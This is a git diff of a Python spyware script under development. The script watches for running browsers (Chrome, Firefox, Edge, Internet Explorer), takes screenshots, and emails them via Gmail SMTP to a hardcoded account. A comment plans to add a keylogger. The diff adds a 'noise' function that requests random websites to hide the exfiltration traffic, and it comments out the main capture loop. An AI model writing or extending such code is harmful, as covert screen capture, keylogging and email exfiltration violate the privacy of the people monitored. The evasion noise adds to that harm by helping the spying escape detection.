@@ -13,8 +13,12 @@ from email.message import EmailMessage
 #dobuwać keyloogera
 import subprocess
 import os
+from list_of_website import websites
+import requests
 
-time_interval = random.randint(5, 15)
+
+time_interval_screen = random.randint(10, 60)
+interval_noise_mail = random.randint(10,20)
 smpt_server = 'smtp.gmail.com'
 smtp_port = 465
 smtp_acct = 'becyp2137@gmail.com'
@@ -90,13 +94,21 @@ def process_exists(process_name = "chrome.exe"):
 # add noise generator for example, nmap genreator, change mail names for diffrent
 # allso send more emails for more random address 
 
+def noise():
+    web_addr = websites[random.randint(0,1000)]
+    print(requests.get(web_addr))
+    print(web_addr)
+
+noise()
+"""
 if __name__ == '__main__':
     while True:
         now = datetime.now() # current date and time
         date_time = now.strftime("%m/%d/%Y, %H:%M:%S")
-        if(process_exists('chrome.exe') or process_exists('firefox.exe') ):
+        if(process_exists('chrome.exe') or process_exists('firefox.exe') or process_exists('msedge.exe') or process_exists("iexplore.exe")):
             screenshot_email(date_time, date_time)
             print(f"message send: {now}")
-        sleep(time_interval)
+        sleep(time_interval_screen)
+"""
 
 
